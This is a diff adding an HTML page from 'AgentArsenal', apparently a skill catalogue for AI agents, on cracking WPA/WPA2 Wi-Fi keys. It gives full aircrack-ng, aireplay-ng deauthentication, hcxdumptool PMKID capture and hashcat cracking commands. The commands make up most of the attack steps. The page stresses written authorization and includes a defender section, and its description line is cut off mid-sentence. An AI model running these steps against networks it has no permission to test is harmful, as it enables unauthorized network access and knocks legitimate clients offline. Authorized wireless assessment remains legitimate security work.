@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: wireless-wpa</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>wireless-wpa</h2><div class="meta"><span class="badge gray">network</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing Wi-Fi security on authorized engagements with</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="recon-active.html">recon-active</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>aircrack-ng</td><td>1.7</td></tr><tr><td>hashcat</td><td>6.2.6</td></tr><tr><td>Wireshark</td><td>4.4</td></tr></tbody></table><p>WPA2-PSK security rests entirely on the pre-shared key: capture the four-way handshake (or a PMKID) and the key becomes an offline cracking problem. This skill covers authorized wireless assessment with the aircrack-ng suite: preparing a monitor mode adapter, surveying the airspace, capturing handshakes with minimal disruption, converting captures for hashcat, and cracking with wordlists and rules. It covers WPA and WPA2 personal modes and notes where WPA3 changes the game. Wireless testing needs explicit written permission for the target network, and deauthentication is used sparingly because it briefly disconnects legitimate clients. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm the target SSID and BSSID are in the written scope, and check</li>
+<p>local law on wireless testing.</p>
+<li>Put a compatible adapter into monitor mode and verify it captures.</li>
+<li>Survey the airspace: list access points, channels, signal, and clients.</li>
+<li>Lock onto the target channel and capture a four-way handshake,</li>
+<p>deauthenticating one client at a time if needed.</p>
+<li>Verify the capture contains a full handshake before leaving the site.</li>
+<li>Convert the capture and crack it offline with hashcat or aircrack-ng.</li>
+<li>Document the key strength result and re-secure notes on what was found.</li>
+</ol>
+<h2>1. Prepare the adapter</h2>
+<p>You need a USB adapter with a chipset that supports monitor mode and packet injection (Atheros AR9271 and Ralink RT3070 class chips are the classic safe choices). Built-in laptop cards often lack injection.</p>
+<pre><code class="language-bash"># List wireless interfaces
+iwconfig 2&gt;/dev/null | grep -E &#x27;^[a-z]&#x27; | cut -d&#x27; &#x27; -f1
+ip link | grep -E &#x27;wl|wlan&#x27;
+
+# Kill processes that fight for the adapter (NetworkManager, wpa_supplicant)
+sudo airmon-ng check kill
+
+# Start monitor mode on wlan0
+sudo airmon-ng start wlan0</code></pre>
+<p><code>airmon-ng start</code> creates <code>wlan0mon</code>. Verify monitor mode is real:</p>
+<pre><code class="language-bash">iwconfig wlan0mon | grep -i mode
+# Expect: Mode:Monitor
+
+# Quick capture sanity check: you should see beacon frames
+sudo timeout 10 airodump-ng wlan0mon | head -20</code></pre>
+<p>If <code>airmon-ng</code> fails, set monitor mode manually:</p>
+<pre><code class="language-bash">sudo ip link set wlan0 down
+sudo iw dev wlan0 set type monitor
+sudo ip link set wlan0 up
+iw dev wlan0 info | grep type</code></pre>
+<h2>2. Survey the airspace</h2>
+<p>Run a broad survey first to map every network, then narrow to the target. Record BSSIDs, channels, signal strength, encryption, and associated clients.</p>
+<pre><code class="language-bash"># Full survey, writing all formats for later review
+sudo airodump-ng wlan0mon -w /tmp/survey --output-format csv,cap
+
+# Survey one band to reduce noise (2.4 GHz channels 1-11 example)
+sudo airodump-ng wlan0mon --band bg -w /tmp/survey-bg</code></pre>
+<p>Let it run two to three minutes. In the top table, find the target SSID and note its BSSID, channel (CH), and privacy flags (WPA2, CCMP, PSK). In the bottom table, note client STATIONs tied to that BSSID; you need at least one connected client for a deauth-driven handshake capture.</p>
+<pre><code class="language-bash"># Parse the CSV for the target network quickly
+grep -i &quot;TargetSSID&quot; /tmp/survey-01.csv | head -5</code></pre>
+<h2>3. Capture the four-way handshake</h2>
+<p>Lock the adapter to the target channel and capture only the target BSSID. This keeps the capture small and avoids touching other networks.</p>
+<pre><code class="language-bash"># Targeted capture: BSSID and channel from the survey
+sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF --channel 6 \
+  -w /tmp/target --output-format cap</code></pre>
+<p>Leave that running in one terminal. In a second terminal, wait for the top right of airodump to show <code>WPA handshake: AA:BB:CC:DD:EE:FF</code>. Handshakes happen naturally when clients join; if none appears after a few minutes, deauthenticate one client to force a reconnect:</p>
+<pre><code class="language-bash"># Deauth ONE client (its MAC from the survey), 5 bursts, then stop
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon</code></pre>
+<p>Rules for deauth: one client at a time, short bursts, never broadcast deauth (<code>-c</code> omitted hits everyone and is disruptive). Watch the airodump window for the handshake line, then stop both commands. Verify the capture before you pack up:</p>
+<pre><code class="language-bash"># Check the capture really holds a full handshake (EAPOL 1-4)
+sudo aircrack-ng /tmp/target-01.cap | head -20
+# Look for: &quot;1 handshake&quot; next to the target network line
+
+# Deeper check with tshark: count EAPOL key frames
+tshark -r /tmp/target-01.cap -Y eapol 2&gt;/dev/null | wc -l</code></pre>
+<p>Four EAPOL frames (messages 1 through 4, or at least 1 and 2) mean a crackable handshake. If aircrack-ng says <code>0 handshake</code>, the capture missed it; repeat the deauth once more.</p>
+<h2>4. Crack the handshake offline</h2>
+<p>Cracking is offline and safe to run anywhere. Convert the capture to hashcat format for speed, or crack directly with aircrack-ng for simplicity.</p>
+<pre><code class="language-bash"># Convert cap to hashcat mode 22000 format
+hcxpcapngtool -o /tmp/target.22000 /tmp/target-01.cap
+
+# hashcat WPA crack with a wordlist
+hashcat -m 22000 /tmp/target.22000 /usr/share/wordlists/rockyou.txt
+
+# Show the cracked key
+hashcat -m 22000 /tmp/target.22000 --show</code></pre>
+<pre><code class="language-bash"># aircrack-ng direct crack (simpler, slower, no conversion)
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
+  -b AA:BB:CC:DD:EE:FF /tmp/target-01.cap</code></pre>
+<p>Improve hit rate with rules and targeted lists before resorting to masks:</p>
+<pre><code class="language-bash"># Best64 rules mutate each word 64 ways (fast, high value)
+hashcat -m 22000 /tmp/target.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Company-specific wordlist first: SSID variants, site names, years, seasons
+# Build it during recon, then:
+hashcat -m 22000 /tmp/target.22000 /tmp/custom-words.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+<p>WPA keys must be at least 8 characters, so short-wordlist attacks rarely work; rules that append years and symbols (<code>Company2024!</code>) are where real keys fall.</p>
+<h2>5. The PMKID attack (clientless)</h2>
+<p>Some access points include the PMKID in their first EAPOL frame or in association responses, which lets you capture crackable material without any client and without deauthentication.</p>
+<pre><code class="language-bash"># Capture PMKIDs passively with hcxdumptool (part of hcxtools)
+sudo hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --enable_status=1
+
+# Convert and crack like a handshake
+hcxpcapngtool -o /tmp/pmkid.22000 /tmp/pmkid.pcapng
+hashcat -m 22000 /tmp/pmkid.22000 /usr/share/wordlists/rockyou.txt --show</code></pre>
+<p>Let hcxdumptool run several minutes per target; PMKIDs arrive slowly. Not all APs expose them, so treat this as a bonus alongside the handshake capture, not a replacement.</p>
+<h2>6. Prove impact and note WPA3</h2>
+<p>A cracked PSK proves the wireless network is open to anyone in range. Document the key strength (length, pattern) without printing the full key in the report unless the client asks for it. If the key resists cracking, report the handshake capture as proof of a strong key, which is a positive finding.</p>
+<p>WPA3-Personal (SAE) resists offline dictionary attacks: the handshake no longer yields crackable material the same way, and deauth-based capture is far less useful. Against WPA3, focus on downgrade opportunities (is WPA2 transition mode enabled?), weak SAE passwords via active guessing limits, and rogue AP or evil twin scenarios only where explicitly in scope.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The adapter has no monitor mode. Check `iw list | grep -A8 &quot;Supported</li>
+<p>interface modes&quot;`; if monitor is absent, you need different hardware.</p>
+<li>Injection test fails (<code>aireplay-ng --test</code>). Some drivers capture but</li>
+<p>cannot inject; use passive handshake waiting instead of deauth.</p>
+<li>No clients are connected. Without clients there is no handshake to</li>
+<p>capture; use the PMKID attack or wait for a client to join.</p>
+<li>The handshake never completes in the capture. The client may roam or</li>
+<p>the signal is weak; move closer to the AP and retry with a fresh capture file.</p>
+<li>5 GHz targets need a dual band adapter and <code>--band abg</code> in the survey;</li>
+<p>a 2.4 GHz only card never sees them.</p>
+<li>aircrack-ng reports handshake but hashcat finds nothing. Verify with</li>
+<p><code>--show</code> that you are attacking the right network; multi-BSSID captures confuse both tools.</p>
+<li>The AP uses WPA2-Enterprise (802.1X). PSK attacks do not apply; that is</li>
+<p>a different engagement (RADIUS and certificate attacks) and needs its own scope.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>The PSK will not crack with rockyou plus rules. Build a targeted</li>
+<p>wordlist from OSINT on the company (names, dates, products, sports teams) and try mask attacks on the pattern you observe.</p>
+<li>Deauth is forbidden by the scope. Rely on passive capture and the PMKID</li>
+<p>attack only, and note the constraint in the report.</p>
+<li>Multiple SSIDs share one BSSID. Capture once; the handshake works per</li>
+<p>SSID, so confirm which SSID the cracked key belongs to.</p>
+<li>You need to prove lateral value of the key. Connecting to the network</li>
+<p>with the cracked PSK is a separate authorization step; get it in writing before joining, then treat it as a new internal test.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see handshake capture as a monitor mode adapter probing and a burst of deauthentication frames, which wireless intrusion detection systems flag as a deauth attack signature. Cracking itself is offline and invisible. The durable fixes: long random pre-shared keys (20+ characters) stored in a password manager, WPA3-Personal or WPA2-Enterprise instead of PSK where possible, a wireless IDS to alert on deauth floods and rogue APs, and rotating the PSK when staff leave. Separate guest, corporate, and IoT networks so one cracked key does not expose everything.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1110.002 (Brute Force, Password Cracking): PSK cracking.</li>
+<li>MITRE ATT&amp;CK T1557 (Adversary-in-the-Middle): evil twin context.</li>
+<li>CWE-327 (Use of a Broken or Risky Cryptographic Algorithm): weak PSK</li>
+<p>practices and deprecated modes.</p>
+<li>CWE-798 (Use of Hard-coded Credentials): PSKs shared in the open.</li>
+<li>IEEE 802.11i (WPA2) and 802.11-2020 (WPA3 SAE) standards.</li>
+<li>aircrack-ng documentation: https://www.aircrack-ng.org/documentation.html</li>
+<li>hashcat WPA modes: https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
